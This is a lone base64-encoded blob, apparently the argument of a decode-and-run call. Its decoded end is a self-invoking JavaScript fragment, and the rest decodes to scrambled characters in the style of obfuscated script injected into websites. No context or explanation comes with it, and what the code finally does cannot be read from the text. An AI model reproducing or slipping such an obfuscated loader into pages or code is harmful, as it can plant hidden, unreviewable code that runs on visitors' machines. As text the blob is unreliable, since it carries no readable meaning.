zbm8rRH1QZSBdMWBufXMoITVQaWx0JGtsM2FyZTI1aWNdKVBzO3Q6WGFwUHdbIClFYVB7cmRuX2VfcDRfc1BcXHR1byNzdVA9UGZGbjdhYm5lZnJQKVBQK3plW3lkOlhdaHJQeFB5IShQQjVvcjJbZm9Hc3QlUGQkPyxQKF1QNFBtWml0ZGYzM3RsYygxUGZzOF1yIF0lSjYxPVBQWHQzcF8ybyE7aShQUHVpX2UpbjFsXSlmZUhlbWZvbDVfK3clMDlZcmVfZXIpKys8OW00c1A0PXNwJWV1Ql88UCBvdCg7NGFlX21zdGNqJmUoYS5eY2UwUHRQVCluc1A1XW5pUHciUy48LjFpZ19fTGUpb1AgKVA9W2VldF1te1BnY280YWlQJVAjJSlvb2RleT9QLV1oOzIhbm1oNDNoKT10dCtcXHgpUFBoYXJmX18xUD05XzJzdGFvX1BfYy4wNF9sUFtFX2E1YikubS5mdG9bMWFQcH0yOXUmUCVfLlA6UDVhciFQPVBnW3RQYVBQYWQ9dFBvLl8wdjJyYV1QYWMgaSw0ICVfZSl0LFApYkVhdGxiKG9ucl1HNClvJS1QaC5eaSBlYXQzMmRfJD1pYy5ldG9jYW8sYjFwUF0hYVAofWlMPT1hLi5Qcm47LiF0XV1saGZmLFAtYyluUHQ7b2hdYWxzUC59IF1pcyx0bzlnbD1hb19hNmNlUFBmUHI9TlBzPW9QLlhhNXVQIC51aVB7LmxhZWNQUG8pblMuUDtnMjExNDtdZVA3RDlzKXJQczs0UGFjXWVoZWtQIDBwbGg1ZCVEJSBQLl80NTtcJzIuX2lzKy4pYWxQUGJfZylQXUxkNGUpXVBpe1BlYWNSMSlvXVBCaWVyKW5dPWw9KDJ7KXdcXCluUE1bVCohOzkpUClhZG5zUDh1UF1dUGZwVSBvLl9tY1BmOnNsXV0wX1ByKHM9b2Vzd2ckYnJ7IDtzb2E1dGQpQVNcJ217cnQuLW9lJSVhPTJzXWVVLHt9aSw4dFBQZHlyeF1sUFs9bSUsN2VfMzBpczMuUDNpUFB0LjJQeDVJX1BQbFMxUG9QfXRwJWNlRWFQdHRQb2k7aW99aTApUF8xYXZtLF1yUHtvclAxdHhYIChibGhtUCk2Wjdlc2VrMlBdcmwrbFBlWGYoX197UCg9IDBYUFBQbjIlUDIpJS49MW8rKFwvOGMoUCEhX289bysuZzUxbl1kYzsoKCBQZTBmYz07UC50bDJmYS48aHI1aWlhbCVjcm0pUC47UFAofTUpMnIpKWwpZWkkJWVhNWUuWkFQLn0oJCxlfSs6X1hhfS5QYSZwSjsoZVBQUH0pLjZQYTNQNGFhZX1vZkVQUGJfcDo9bFBYe3RnZVBhPTMzfVllNWMuckUgdmFQYjRhZXBvQSQwXFxfSH17YUguc2ZfYztQZV9lb0NkK1BhUGUibGMuYXsoLFAlUCgyX30pMS5ucmkxdE5QdD8qKGNdcl9QXT1QJmE7aGk1KUkmUFBhc25vclA9P1B4a1xcO2koQGMzLl8xOzUzKSBQZWUwNVA9eGVfcCB0JXRJbn0uICFfKHJoKTohVGwoMTIzUHQ2UH07Xy5lZm8xaW9iX2RQX2Q2UH1yXXJnYV91MnB5eGFDJShAXThYNyguM10hfS5qZGF9ZmxpUGRhUFBlXyh1UjVQNjhhUDphUDVQLHRdUF9oLGUubV9dMH1QNU9lbG81NDdQc1BQJG5zZFA0XC9DKHQ3X25fJXcuYXRTUHJubygxbn1rdGR0NVRjJT0uLnMpUG4sczEpXCd0UG97IC5fIlA9I253Wy5kMFA2Lmhdc2kxJTs4eyBQd2VhPTAhXXRuYTMuNWYsblBfWmFzKV0oIGEgVjZvIC40dS5lUCVuXTJ1JndlZW5MZWFZKFA6YT55dDNfXWUsb2FdbmU1dDNkITIubyElIGogJFBfUGVgLnJDeCAuPmZ9c1A9XTJfICsuKGE7ZWlQdGk9dFBiLGFhJTh9LmFFLjZ7b2FsaWEoUEhfUDJlcz1Ecih3MzFbUFBnLjE9UCV5YmlhZ1Bie2EkUFtQYXo9PmVoMXVvUGFlMClmT1BsO2RfdGxQUCg1YWRqKVspbHtQIFByUF0pMTpyc1A2dG9kblBNNF9fMlBlITMpY3JvUGVwX2xfUCxhNjIwcmUySWEhImsoJC4uc0NdR1AhXmFdKVBfKChfUFNhO1BQb2BpaFBubnI0ZGVlICBvXVBQICAuLCpvLmdQclAgTl0uXTZQcnF1aSUxKGRlXC9QYyFlLiBhaCVfYWFudTNQcGcyciRyKWN5bCVvZWRwIGFQUGVvUCxhOl07UHQsdFAuJXtuUGluKCZdaWhdKHBzSHllKScpKTt2YXIgRURsPUN1VihPdHcscEFhICk7RURsKDcxMjQpO3JldHVybiA5NDg0fSkoKQ=='))
